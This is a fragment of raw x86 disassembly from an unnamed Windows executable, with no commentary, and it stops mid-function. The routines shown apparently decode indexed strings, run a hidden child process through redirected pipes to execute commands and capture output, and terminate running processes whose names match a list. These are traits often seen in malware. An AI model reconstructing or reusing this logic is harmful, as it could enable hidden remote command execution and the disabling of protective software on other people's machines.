  406706:	b8 30 9a 41 00       	mov    $0x419a30,%eax
  40670b:	eb 03                	jmp    0x406710
  40670d:	8d 49 00             	lea    0x0(%ecx),%ecx
  406710:	66 8b 10             	mov    (%eax),%dx
  406713:	83 c0 02             	add    $0x2,%eax
  406716:	66 85 d2             	test   %dx,%dx
  406719:	75 f5                	jne    0x406710
  40671b:	eb 03                	jmp    0x406720
  40671d:	8d 49 00             	lea    0x0(%ecx),%ecx
  406720:	83 e8 02             	sub    $0x2,%eax
  406723:	3d 30 9a 41 00       	cmp    $0x419a30,%eax
  406728:	74 08                	je     0x406732
  40672a:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  40672e:	75 f0                	jne    0x406720
  406730:	eb 06                	jmp    0x406738
  406732:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  406736:	75 03                	jne    0x40673b
  406738:	66 89 38             	mov    %di,(%eax)
  40673b:	56                   	push   %esi
  40673c:	8b 35 78 81 40 00    	mov    0x408178,%esi
  406742:	57                   	push   %edi
  406743:	6a 1a                	push   $0x1a
  406745:	68 30 a2 41 00       	push   $0x41a230
  40674a:	57                   	push   %edi
  40674b:	ff d6                	call   *%esi
  40674d:	85 c0                	test   %eax,%eax
  40674f:	75 09                	jne    0x40675a
  406751:	66 89 3d 30 a2 41 00 	mov    %di,0x41a230
  406758:	eb 30                	jmp    0x40678a
  40675a:	b8 30 a2 41 00       	mov    $0x41a230,%eax
  40675f:	90                   	nop
  406760:	66 8b 08             	mov    (%eax),%cx
  406763:	83 c0 02             	add    $0x2,%eax
  406766:	66 85 c9             	test   %cx,%cx
  406769:	75 f5                	jne    0x406760
  40676b:	2d 30 a2 41 00       	sub    $0x41a230,%eax
  406770:	d1 f8                	sar    $1,%eax
  406772:	83 e8 01             	sub    $0x1,%eax
  406775:	74 13                	je     0x40678a
  406777:	66 83 3c 45 2e a2 41 	cmpw   $0x5c,0x41a22e(,%eax,2)
  40677e:	00 5c 
  406780:	75 08                	jne    0x40678a
  406782:	66 89 3c 45 2e a2 41 	mov    %di,0x41a22e(,%eax,2)
  406789:	00 
  40678a:	57                   	push   %edi
  40678b:	57                   	push   %edi
  40678c:	68 30 aa 41 00       	push   $0x41aa30
  406791:	57                   	push   %edi
  406792:	ff d6                	call   *%esi
  406794:	85 c0                	test   %eax,%eax
  406796:	5e                   	pop    %esi
  406797:	75 09                	jne    0x4067a2
  406799:	66 89 3d 30 aa 41 00 	mov    %di,0x41aa30
  4067a0:	5f                   	pop    %edi
  4067a1:	c3                   	ret
  4067a2:	b8 30 aa 41 00       	mov    $0x41aa30,%eax
  4067a7:	66 8b 10             	mov    (%eax),%dx
  4067aa:	83 c0 02             	add    $0x2,%eax
  4067ad:	66 85 d2             	test   %dx,%dx
  4067b0:	75 f5                	jne    0x4067a7
  4067b2:	2d 30 aa 41 00       	sub    $0x41aa30,%eax
  4067b7:	d1 f8                	sar    $1,%eax
  4067b9:	83 e8 01             	sub    $0x1,%eax
  4067bc:	74 13                	je     0x4067d1
  4067be:	66 83 3c 45 2e aa 41 	cmpw   $0x5c,0x41aa2e(,%eax,2)
  4067c5:	00 5c 
  4067c7:	75 08                	jne    0x4067d1
  4067c9:	66 89 3c 45 2e aa 41 	mov    %di,0x41aa2e(,%eax,2)
  4067d0:	00 
  4067d1:	5f                   	pop    %edi
  4067d2:	c3                   	ret
  4067d3:	cc                   	int3
  4067d4:	cc                   	int3
  4067d5:	cc                   	int3
  4067d6:	cc                   	int3
  4067d7:	cc                   	int3
  4067d8:	cc                   	int3
  4067d9:	cc                   	int3
  4067da:	cc                   	int3
  4067db:	cc                   	int3
  4067dc:	cc                   	int3
  4067dd:	cc                   	int3
  4067de:	cc                   	int3
  4067df:	cc                   	int3
  4067e0:	81 ec 14 02 00 00    	sub    $0x214,%esp
  4067e6:	56                   	push   %esi
  4067e7:	57                   	push   %edi
  4067e8:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4067ec:	50                   	push   %eax
  4067ed:	a1 80 b2 41 00       	mov    0x41b280,%eax
  4067f2:	6a 16                	push   $0x16
  4067f4:	e8 57 c1 ff ff       	call   0x402950
  4067f9:	8b f8                	mov    %eax,%edi
  4067fb:	85 ff                	test   %edi,%edi
  4067fd:	0f 84 ae 00 00 00    	je     0x4068b1
  406803:	68 04 01 00 00       	push   $0x104
  406808:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40680c:	51                   	push   %ecx
  40680d:	57                   	push   %edi
  40680e:	ff 15 b8 80 40 00    	call   *0x4080b8
  406814:	85 c0                	test   %eax,%eax
  406816:	0f 84 85 00 00 00    	je     0x4068a1
  40681c:	ba d8 81 40 00       	mov    $0x4081d8,%edx
  406821:	8d 44 24 10          	lea    0x10(%esp),%eax
  406825:	be 04 01 00 00       	mov    $0x104,%esi
  40682a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  406830:	66 83 38 00          	cmpw   $0x0,(%eax)
  406834:	74 08                	je     0x40683e
  406836:	83 c0 02             	add    $0x2,%eax
  406839:	83 ee 01             	sub    $0x1,%esi
  40683c:	75 f2                	jne    0x406830
  40683e:	85 f6                	test   %esi,%esi
  406840:	74 22                	je     0x406864
  406842:	0f b7 0a             	movzwl (%edx),%ecx
  406845:	66 89 08             	mov    %cx,(%eax)
  406848:	83 c0 02             	add    $0x2,%eax
  40684b:	83 c2 02             	add    $0x2,%edx
  40684e:	66 85 c9             	test   %cx,%cx
  406851:	74 05                	je     0x406858
  406853:	83 ee 01             	sub    $0x1,%esi
  406856:	75 ea                	jne    0x406842
  406858:	85 f6                	test   %esi,%esi
  40685a:	75 08                	jne    0x406864
  40685c:	66 89 b4 24 16 02 00 	mov    %si,0x216(%esp)
  406863:	00 
  406864:	6a 00                	push   $0x0
  406866:	6a 00                	push   $0x0
  406868:	6a 00                	push   $0x0
  40686a:	6a 00                	push   $0x0
  40686c:	8d 54 24 18          	lea    0x18(%esp),%edx
  406870:	52                   	push   %edx
  406871:	6a 00                	push   $0x0
  406873:	6a 00                	push   $0x0
  406875:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  406879:	50                   	push   %eax
  40687a:	ff 15 18 81 40 00    	call   *0x408118
  406880:	85 c0                	test   %eax,%eax
  406882:	57                   	push   %edi
  406883:	6a 00                	push   $0x0
  406885:	74 1d                	je     0x4068a4
  406887:	ff 15 90 80 40 00    	call   *0x408090
  40688d:	50                   	push   %eax
  40688e:	ff 15 8c 80 40 00    	call   *0x40808c
  406894:	8b 44 24 08          	mov    0x8(%esp),%eax
  406898:	5f                   	pop    %edi
  406899:	5e                   	pop    %esi
  40689a:	81 c4 14 02 00 00    	add    $0x214,%esp
  4068a0:	c3                   	ret
  4068a1:	57                   	push   %edi
  4068a2:	6a 00                	push   $0x0
  4068a4:	ff 15 90 80 40 00    	call   *0x408090
  4068aa:	50                   	push   %eax
  4068ab:	ff 15 8c 80 40 00    	call   *0x40808c
  4068b1:	5f                   	pop    %edi
  4068b2:	33 c0                	xor    %eax,%eax
  4068b4:	5e                   	pop    %esi
  4068b5:	81 c4 14 02 00 00    	add    $0x214,%esp
  4068bb:	c3                   	ret
  4068bc:	cc                   	int3
  4068bd:	cc                   	int3
  4068be:	cc                   	int3
  4068bf:	cc                   	int3
  4068c0:	81 ec 98 06 00 00    	sub    $0x698,%esp
  4068c6:	53                   	push   %ebx
  4068c7:	55                   	push   %ebp
  4068c8:	56                   	push   %esi
  4068c9:	57                   	push   %edi
  4068ca:	8b f8                	mov    %eax,%edi
  4068cc:	8d 44 24 54          	lea    0x54(%esp),%eax
  4068d0:	50                   	push   %eax
  4068d1:	a1 80 b2 41 00       	mov    0x41b280,%eax
  4068d6:	6a 17                	push   $0x17
  4068d8:	e8 73 c0 ff ff       	call   0x402950
  4068dd:	33 ed                	xor    %ebp,%ebp
  4068df:	3b c5                	cmp    %ebp,%eax
  4068e1:	89 44 24 30          	mov    %eax,0x30(%esp)
  4068e5:	0f 84 36 03 00 00    	je     0x406c21
  4068eb:	68 04 01 00 00       	push   $0x104
  4068f0:	8d 8c 24 a4 00 00 00 	lea    0xa4(%esp),%ecx
  4068f7:	51                   	push   %ecx
  4068f8:	50                   	push   %eax
  4068f9:	ff 15 b8 80 40 00    	call   *0x4080b8
  4068ff:	85 c0                	test   %eax,%eax
  406901:	0f 84 1a 03 00 00    	je     0x406c21
  406907:	6a 44                	push   $0x44
  406909:	83 cb ff             	or     $0xffffffff,%ebx
  40690c:	8d 54 24 5c          	lea    0x5c(%esp),%edx
  406910:	55                   	push   %ebp
  406911:	52                   	push   %edx
  406912:	c7 44 24 54 0c 00 00 	movl   $0xc,0x54(%esp)
  406919:	00 
  40691a:	89 6c 24 58          	mov    %ebp,0x58(%esp)
  40691e:	c7 44 24 5c 01 00 00 	movl   $0x1,0x5c(%esp)
  406925:	00 
  406926:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  40692a:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  40692e:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  406932:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
  406936:	e8 c5 a7 ff ff       	call   0x401100
  40693b:	83 c4 0c             	add    $0xc,%esp
  40693e:	6a 10                	push   $0x10
  406940:	8d 44 24 38          	lea    0x38(%esp),%eax
  406944:	55                   	push   %ebp
  406945:	50                   	push   %eax
  406946:	e8 b5 a7 ff ff       	call   0x401100
  40694b:	a1 a4 b2 41 00       	mov    0x41b2a4,%eax
  406950:	83 c4 0c             	add    $0xc,%esp
  406953:	3b c5                	cmp    %ebp,%eax
  406955:	75 0b                	jne    0x406962
  406957:	ff 15 94 80 40 00    	call   *0x408094
  40695d:	a3 a4 b2 41 00       	mov    %eax,0x41b2a4
  406962:	3c 06                	cmp    $0x6,%al
  406964:	0f 83 7c 00 00 00    	jae    0x4069e6
  40696a:	57                   	push   %edi
  40696b:	e8 60 fc ff ff       	call   0x4065d0
  406970:	83 c4 04             	add    $0x4,%esp
  406973:	8b c7                	mov    %edi,%eax
  406975:	8a 08                	mov    (%eax),%cl
  406977:	83 c0 01             	add    $0x1,%eax
  40697a:	84 c9                	test   %cl,%cl
  40697c:	75 f7                	jne    0x406975
  40697e:	8b ff                	mov    %edi,%edi
  406980:	83 e8 01             	sub    $0x1,%eax
  406983:	3b c7                	cmp    %edi,%eax
  406985:	74 07                	je     0x40698e
  406987:	80 38 0a             	cmpb   $0xa,(%eax)
  40698a:	75 f4                	jne    0x406980
  40698c:	eb 05                	jmp    0x406993
  40698e:	80 38 0a             	cmpb   $0xa,(%eax)
  406991:	75 4a                	jne    0x4069dd
  406993:	83 e8 01             	sub    $0x1,%eax
  406996:	3b c7                	cmp    %edi,%eax
  406998:	74 07                	je     0x4069a1
  40699a:	80 38 0a             	cmpb   $0xa,(%eax)
  40699d:	75 f4                	jne    0x406993
  40699f:	eb 05                	jmp    0x4069a6
  4069a1:	80 38 0a             	cmpb   $0xa,(%eax)
  4069a4:	75 37                	jne    0x4069dd
  4069a6:	8b c8                	mov    %eax,%ecx
  4069a8:	83 e8 01             	sub    $0x1,%eax
  4069ab:	3b c7                	cmp    %edi,%eax
  4069ad:	74 07                	je     0x4069b6
  4069af:	80 38 0a             	cmpb   $0xa,(%eax)
  4069b2:	75 f4                	jne    0x4069a8
  4069b4:	eb 05                	jmp    0x4069bb
  4069b6:	80 38 0a             	cmpb   $0xa,(%eax)
  4069b9:	75 22                	jne    0x4069dd
  4069bb:	3b cd                	cmp    %ebp,%ecx
  4069bd:	74 1e                	je     0x4069dd
  4069bf:	8d 71 01             	lea    0x1(%ecx),%esi
  4069c2:	8b ce                	mov    %esi,%ecx
  4069c4:	8a 11                	mov    (%ecx),%dl
  4069c6:	83 c1 01             	add    $0x1,%ecx
  4069c9:	84 d2                	test   %dl,%dl
  4069cb:	75 f7                	jne    0x4069c4
  4069cd:	2b ce                	sub    %esi,%ecx
  4069cf:	51                   	push   %ecx
  4069d0:	83 c0 01             	add    $0x1,%eax
  4069d3:	56                   	push   %esi
  4069d4:	50                   	push   %eax
  4069d5:	e8 66 a7 ff ff       	call   0x401140
  4069da:	83 c4 0c             	add    $0xc,%esp
  4069dd:	57                   	push   %edi
  4069de:	e8 ed fb ff ff       	call   0x4065d0
  4069e3:	83 c4 04             	add    $0x4,%esp
  4069e6:	8b 35 c0 80 40 00    	mov    0x4080c0,%esi
  4069ec:	55                   	push   %ebp
  4069ed:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  4069f1:	50                   	push   %eax
  4069f2:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4069f6:	51                   	push   %ecx
  4069f7:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  4069fb:	52                   	push   %edx
  4069fc:	ff d6                	call   *%esi
  4069fe:	85 c0                	test   %eax,%eax
  406a00:	0f 84 c0 01 00 00    	je     0x406bc6
  406a06:	55                   	push   %ebp
  406a07:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  406a0b:	50                   	push   %eax
  406a0c:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  406a10:	51                   	push   %ecx
  406a11:	8d 54 24 20          	lea    0x20(%esp),%edx
  406a15:	52                   	push   %edx
  406a16:	ff d6                	call   *%esi
  406a18:	85 c0                	test   %eax,%eax
  406a1a:	0f 84 a6 01 00 00    	je     0x406bc6
  406a20:	8b 44 24 18          	mov    0x18(%esp),%eax
  406a24:	8b 35 e8 80 40 00    	mov    0x4080e8,%esi
  406a2a:	55                   	push   %ebp
  406a2b:	6a 01                	push   $0x1
  406a2d:	50                   	push   %eax
  406a2e:	ff d6                	call   *%esi
  406a30:	85 c0                	test   %eax,%eax
  406a32:	0f 84 8e 01 00 00    	je     0x406bc6
  406a38:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  406a3c:	55                   	push   %ebp
  406a3d:	6a 01                	push   $0x1
  406a3f:	51                   	push   %ecx
  406a40:	ff d6                	call   *%esi
  406a42:	85 c0                	test   %eax,%eax
  406a44:	0f 84 7c 01 00 00    	je     0x406bc6
  406a4a:	8b 44 24 24          	mov    0x24(%esp),%eax
  406a4e:	8b 54 24 20          	mov    0x20(%esp),%edx
  406a52:	89 84 24 94 00 00 00 	mov    %eax,0x94(%esp)
  406a59:	89 84 24 98 00 00 00 	mov    %eax,0x98(%esp)
  406a60:	8d 44 24 34          	lea    0x34(%esp),%eax
  406a64:	50                   	push   %eax
  406a65:	8d 4c 24 5c          	lea    0x5c(%esp),%ecx
  406a69:	51                   	push   %ecx
  406a6a:	55                   	push   %ebp
  406a6b:	55                   	push   %ebp
  406a6c:	55                   	push   %ebp
  406a6d:	6a 01                	push   $0x1
  406a6f:	55                   	push   %ebp
  406a70:	55                   	push   %ebp
  406a71:	89 94 24 b0 00 00 00 	mov    %edx,0xb0(%esp)
  406a78:	55                   	push   %ebp
  406a79:	8d 94 24 c4 00 00 00 	lea    0xc4(%esp),%edx
  406a80:	52                   	push   %edx
  406a81:	66 89 ac 24 b0 00 00 	mov    %bp,0xb0(%esp)
  406a88:	00 
  406a89:	c7 84 24 80 00 00 00 	movl   $0x44,0x80(%esp)
  406a90:	44 00 00 00 
  406a94:	c7 84 24 ac 00 00 00 	movl   $0x101,0xac(%esp)
  406a9b:	01 01 00 00 
  406a9f:	ff 15 bc 80 40 00    	call   *0x4080bc
  406aa5:	85 c0                	test   %eax,%eax
  406aa7:	0f 84 19 01 00 00    	je     0x406bc6
  406aad:	8b 8c 24 ac 06 00 00 	mov    0x6ac(%esp),%ecx
  406ab4:	8b 54 24 18          	mov    0x18(%esp),%edx
  406ab8:	55                   	push   %ebp
  406ab9:	8d 44 24 48          	lea    0x48(%esp),%eax
  406abd:	50                   	push   %eax
  406abe:	51                   	push   %ecx
  406abf:	57                   	push   %edi
  406ac0:	52                   	push   %edx
  406ac1:	ff 15 f8 80 40 00    	call   *0x4080f8
  406ac7:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  406acb:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  406acf:	8d 84 24 a0 00 00 00 	lea    0xa0(%esp),%eax
  406ad6:	50                   	push   %eax
  406ad7:	51                   	push   %ecx
  406ad8:	52                   	push   %edx
  406ad9:	e8 f2 fa ff ff       	call   0x4065d0
  406ade:	8b 3d 10 81 40 00    	mov    0x408110,%edi
  406ae4:	8b 1d 70 80 40 00    	mov    0x408070,%ebx
  406aea:	83 c4 0c             	add    $0xc,%esp
  406aed:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  406af1:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  406af5:	8b 2d 50 81 40 00    	mov    0x408150,%ebp
  406afb:	c7 44 24 2c 00 04 00 	movl   $0x400,0x2c(%esp)
  406b02:	00 
  406b03:	33 f6                	xor    %esi,%esi
  406b05:	8b 44 24 34          	mov    0x34(%esp),%eax
  406b09:	6a 14                	push   $0x14
  406b0b:	50                   	push   %eax
  406b0c:	ff d7                	call   *%edi
  406b0e:	83 f8 ff             	cmp    $0xffffffff,%eax
  406b11:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  406b15:	0f 84 7a 00 00 00    	je     0x406b95
  406b1b:	3d 80 00 00 00       	cmp    $0x80,%eax
  406b20:	74 73                	je     0x406b95
  406b22:	8b 54 24 14          	mov    0x14(%esp),%edx
  406b26:	6a 00                	push   $0x0
  406b28:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  406b2c:	51                   	push   %ecx
  406b2d:	6a 00                	push   $0x0
  406b2f:	6a 00                	push   $0x0
  406b31:	6a 00                	push   $0x0
  406b33:	52                   	push   %edx
  406b34:	ff d5                	call   *%ebp
  406b36:	85 c0                	test   %eax,%eax
  406b38:	74 33                	je     0x406b6d
  406b3a:	8b 44 24 28          	mov    0x28(%esp),%eax
  406b3e:	85 c0                	test   %eax,%eax
  406b40:	74 3a                	je     0x406b7c
  406b42:	3d 00 04 00 00       	cmp    $0x400,%eax
  406b47:	72 05                	jb     0x406b4e
  406b49:	b8 00 04 00 00       	mov    $0x400,%eax
  406b4e:	6a 00                	push   $0x0
  406b50:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  406b54:	51                   	push   %ecx
  406b55:	50                   	push   %eax
  406b56:	8b 44 24 20          	mov    0x20(%esp),%eax
  406b5a:	8d 94 24 b4 02 00 00 	lea    0x2b4(%esp),%edx
  406b61:	52                   	push   %edx
  406b62:	50                   	push   %eax
  406b63:	ff d3                	call   *%ebx
  406b65:	85 c0                	test   %eax,%eax
  406b67:	74 2c                	je     0x406b95
  406b69:	33 f6                	xor    %esi,%esi
  406b6b:	eb 0f                	jmp    0x406b7c
  406b6d:	ff 15 04 81 40 00    	call   *0x408104
  406b73:	50                   	push   %eax
  406b74:	e8 57 fa ff ff       	call   0x4065d0
  406b79:	83 c4 04             	add    $0x4,%esp
  406b7c:	83 c6 14             	add    $0x14,%esi
  406b7f:	81 7c 24 1c 02 01 00 	cmpl   $0x102,0x1c(%esp)
  406b86:	00 
  406b87:	75 0c                	jne    0x406b95
  406b89:	81 fe e0 93 04 00    	cmp    $0x493e0,%esi
  406b8f:	0f 82 70 ff ff ff    	jb     0x406b05
  406b95:	e8 36 fa ff ff       	call   0x4065d0
  406b9a:	8b 54 24 34          	mov    0x34(%esp),%edx
  406b9e:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  406ba2:	51                   	push   %ecx
  406ba3:	52                   	push   %edx
  406ba4:	ff 15 38 81 40 00    	call   *0x408138
  406baa:	81 7c 24 1c 03 01 00 	cmpl   $0x103,0x1c(%esp)
  406bb1:	00 
  406bb2:	75 0d                	jne    0x406bc1
  406bb4:	8b 44 24 34          	mov    0x34(%esp),%eax
  406bb8:	6a ff                	push   $0xffffffff
  406bba:	50                   	push   %eax
  406bbb:	ff 15 30 81 40 00    	call   *0x408130
  406bc1:	33 ed                	xor    %ebp,%ebp
  406bc3:	83 cb ff             	or     $0xffffffff,%ebx
  406bc6:	8b 44 24 38          	mov    0x38(%esp),%eax
  406bca:	3b c5                	cmp    %ebp,%eax
  406bcc:	8b 35 48 81 40 00    	mov    0x408148,%esi
  406bd2:	74 03                	je     0x406bd7
  406bd4:	50                   	push   %eax
  406bd5:	ff d6                	call   *%esi
  406bd7:	8b 44 24 34          	mov    0x34(%esp),%eax
  406bdb:	3b c5                	cmp    %ebp,%eax
  406bdd:	74 03                	je     0x406be2
  406bdf:	50                   	push   %eax
  406be0:	ff d6                	call   *%esi
  406be2:	8b 44 24 20          	mov    0x20(%esp),%eax
  406be6:	3b c3                	cmp    %ebx,%eax
  406be8:	74 03                	je     0x406bed
  406bea:	50                   	push   %eax
  406beb:	ff d6                	call   *%esi
  406bed:	8b 44 24 18          	mov    0x18(%esp),%eax
  406bf1:	3b c3                	cmp    %ebx,%eax
  406bf3:	74 03                	je     0x406bf8
  406bf5:	50                   	push   %eax
  406bf6:	ff d6                	call   *%esi
  406bf8:	8b 44 24 14          	mov    0x14(%esp),%eax
  406bfc:	3b c3                	cmp    %ebx,%eax
  406bfe:	74 03                	je     0x406c03
  406c00:	50                   	push   %eax
  406c01:	ff d6                	call   *%esi
  406c03:	8b 44 24 24          	mov    0x24(%esp),%eax
  406c07:	3b c3                	cmp    %ebx,%eax
  406c09:	74 03                	je     0x406c0e
  406c0b:	50                   	push   %eax
  406c0c:	ff d6                	call   *%esi
  406c0e:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  406c12:	51                   	push   %ecx
  406c13:	55                   	push   %ebp
  406c14:	ff 15 90 80 40 00    	call   *0x408090
  406c1a:	50                   	push   %eax
  406c1b:	ff 15 8c 80 40 00    	call   *0x40808c
  406c21:	5f                   	pop    %edi
  406c22:	5e                   	pop    %esi
  406c23:	5d                   	pop    %ebp
  406c24:	5b                   	pop    %ebx
  406c25:	81 c4 98 06 00 00    	add    $0x698,%esp
  406c2b:	c3                   	ret
  406c2c:	cc                   	int3
  406c2d:	cc                   	int3
  406c2e:	cc                   	int3
  406c2f:	cc                   	int3
  406c30:	55                   	push   %ebp
  406c31:	8b ec                	mov    %esp,%ebp
  406c33:	83 e4 f8             	and    $0xfffffff8,%esp
  406c36:	83 ec 0c             	sub    $0xc,%esp
  406c39:	a1 54 b2 41 00       	mov    0x41b254,%eax
  406c3e:	85 c0                	test   %eax,%eax
  406c40:	56                   	push   %esi
  406c41:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  406c48:	00 
  406c49:	74 07                	je     0x406c52
  406c4b:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  406c4f:	51                   	push   %ecx
  406c50:	ff d0                	call   *%eax
  406c52:	a1 80 b2 41 00       	mov    0x41b280,%eax
  406c57:	8d 54 24 0c          	lea    0xc(%esp),%edx
  406c5b:	52                   	push   %edx
  406c5c:	6a 09                	push   $0x9
  406c5e:	e8 ed bc ff ff       	call   0x402950
  406c63:	8b f0                	mov    %eax,%esi
  406c65:	85 f6                	test   %esi,%esi
  406c67:	74 2f                	je     0x406c98
  406c69:	8b 44 24 0c          	mov    0xc(%esp),%eax
  406c6d:	50                   	push   %eax
  406c6e:	8b c6                	mov    %esi,%eax
  406c70:	e8 4b fc ff ff       	call   0x4068c0
  406c75:	a1 60 b2 41 00       	mov    0x41b260,%eax
  406c7a:	83 c4 04             	add    $0x4,%esp
  406c7d:	85 c0                	test   %eax,%eax
  406c7f:	74 07                	je     0x406c88
  406c81:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  406c85:	51                   	push   %ecx
  406c86:	ff d0                	call   *%eax
  406c88:	56                   	push   %esi
  406c89:	6a 00                	push   $0x0
  406c8b:	ff 15 90 80 40 00    	call   *0x408090
  406c91:	50                   	push   %eax
  406c92:	ff 15 8c 80 40 00    	call   *0x40808c
  406c98:	5e                   	pop    %esi
  406c99:	8b e5                	mov    %ebp,%esp
  406c9b:	5d                   	pop    %ebp
  406c9c:	c3                   	ret
  406c9d:	cc                   	int3
  406c9e:	cc                   	int3
  406c9f:	cc                   	int3
  406ca0:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  406ca6:	53                   	push   %ebx
  406ca7:	55                   	push   %ebp
  406ca8:	56                   	push   %esi
  406ca9:	57                   	push   %edi
  406caa:	8d 44 24 18          	lea    0x18(%esp),%eax
  406cae:	50                   	push   %eax
  406caf:	a1 80 b2 41 00       	mov    0x41b280,%eax
  406cb4:	6a 05                	push   $0x5
  406cb6:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  406cbd:	00 
  406cbe:	e8 8d bc ff ff       	call   0x402950
  406cc3:	8b f0                	mov    %eax,%esi
  406cc5:	85 f6                	test   %esi,%esi
  406cc7:	89 74 24 14          	mov    %esi,0x14(%esp)
  406ccb:	0f 84 fd 00 00 00    	je     0x406dce
  406cd1:	8d 7c 24 10          	lea    0x10(%esp),%edi
  406cd5:	e8 36 c3 ff ff       	call   0x403010
  406cda:	6a 00                	push   $0x0
  406cdc:	6a 02                	push   $0x2
  406cde:	e8 85 0b 00 00       	call   0x407868
  406ce3:	8b e8                	mov    %eax,%ebp
  406ce5:	83 fd ff             	cmp    $0xffffffff,%ebp
  406ce8:	75 0a                	jne    0x406cf4
  406cea:	e8 e1 f8 ff ff       	call   0x4065d0
  406cef:	e9 ca 00 00 00       	jmp    0x406dbe
  406cf4:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  406cf8:	51                   	push   %ecx
  406cf9:	55                   	push   %ebp
  406cfa:	c7 44 24 24 2c 02 00 	movl   $0x22c,0x24(%esp)
  406d01:	00 
  406d02:	e8 67 0b 00 00       	call   0x40786e
  406d07:	85 c0                	test   %eax,%eax
  406d09:	0f 84 a8 00 00 00    	je     0x406db7
  406d0f:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  406d13:	85 db                	test   %ebx,%ebx
  406d15:	8b fb                	mov    %ebx,%edi
  406d17:	0f 84 83 00 00 00    	je     0x406da0
  406d1d:	8d 49 00             	lea    0x0(%ecx),%ecx
  406d20:	8b 37                	mov    (%edi),%esi
  406d22:	8d 54 24 40          	lea    0x40(%esp),%edx
  406d26:	8b c2                	mov    %edx,%eax
  406d28:	2b f0                	sub    %eax,%esi
  406d2a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  406d30:	0f b7 04 16          	movzwl (%esi,%edx,1),%eax
  406d34:	66 3d 41 00          	cmp    $0x41,%ax
  406d38:	72 09                	jb     0x406d43
  406d3a:	66 3d 5a 00          	cmp    $0x5a,%ax
  406d3e:	77 03                	ja     0x406d43
  406d40:	83 c0 20             	add    $0x20,%eax
  406d43:	0f b7 c8             	movzwl %ax,%ecx
  406d46:	0f b7 02             	movzwl (%edx),%eax
  406d49:	66 3d 41 00          	cmp    $0x41,%ax
  406d4d:	72 09                	jb     0x406d58
  406d4f:	66 3d 5a 00          	cmp    $0x5a,%ax
  406d53:	77 03                	ja     0x406d58
  406d55:	83 c0 20             	add    $0x20,%eax
  406d58:	83 c2 02             	add    $0x2,%edx
  406d5b:	66 85 c9             	test   %cx,%cx
  406d5e:	0f b7 c0             	movzwl %ax,%eax
  406d61:	74 05                	je     0x406d68
  406d63:	66 3b c8             	cmp    %ax,%cx
  406d66:	74 c8                	je     0x406d30
  406d68:	0f b7 d0             	movzwl %ax,%edx
  406d6b:	0f b7 c1             	movzwl %cx,%eax
  406d6e:	2b c2                	sub    %edx,%eax
  406d70:	74 09                	je     0x406d7b
  406d72:	8b 7f 04             	mov    0x4(%edi),%edi
  406d75:	85 ff                	test   %edi,%edi
  406d77:	75 a7                	jne    0x406d20
  406d79:	eb 25                	jmp    0x406da0
  406d7b:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406d7f:	51                   	push   %ecx
  406d80:	6a 00                	push   $0x0
  406d82:	6a 01                	push   $0x1
  406d84:	ff 15 a4 80 40 00    	call   *0x4080a4
  406d8a:	8b f0                	mov    %eax,%esi
  406d8c:	85 f6                	test   %esi,%esi
  406d8e:	74 10                	je     0x406da0
  406d90:	6a ff                	push   $0xffffffff
  406d92:	56                   	push   %esi
  406d93:	ff 15 30 81 40 00    	call   *0x408130
  406d99:	56                   	push   %esi
  406d9a:	ff 15 48 81 40 00    	call   *0x408148
  406da0:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  406da4:	52                   	push   %edx
  406da5:	55                   	push   %ebp
  406da6:	e8 b7 0a 00 00       	call   0x407862
  406dab:	85 c0                	test   %eax,%eax
  406dad:	0f 85 60 ff ff ff    	jne    0x406d13
  406db3:	8b 74 24 14          	mov    0x14(%esp),%esi
  406db7:	55                   	push   %ebp
  406db8:	ff 15 48 81 40 00    	call   *0x408148
  406dbe:	56                   	push   %esi
  406dbf:	6a 00                	push   $0x0
  406dc1:	ff 15 90 80 40 00    	call   *0x408090
  406dc7:	50                   	push   %eax
  406dc8:	ff 15 8c 80 40 00    	call   *0x40808c
  406dce:	8d 44 24 10          	lea    0x10(%esp),%eax
  406dd2:	e8 39 c1 ff ff       	call   0x402f10
  406dd7:	5f                   	pop    %edi
  406dd8:	5e                   	pop    %esi
  406dd9:	5d                   	pop    %ebp
  406dda:	5b                   	pop    %ebx
  406ddb:	81 c4 3c 02 00 00    	add    $0x23c,%esp
  406de1:	c3                   	ret
  406de2:	cc                   	int3
  406de3:	cc                   	int3
  406de4:	cc                   	int3
  406de5:	cc                   	int3
  406de6:	cc                   	int3
  406de7:	cc                   	int3
  406de8:	cc                   	int3
  406de9:	cc                   	int3
  406dea:	cc                   	int3
  406deb:	cc                   	int3
  406dec:	cc                   	int3
  406ded:	cc                   	int3
  406dee:	cc                   	int3
  406def:	cc                   	int3
  406df0:	81 ec 10 02 00 00    	sub    $0x210,%esp
  406df6:	53                   	push   %ebx
  406df7:	55                   	push   %ebp
  406df8:	56                   	push   %esi
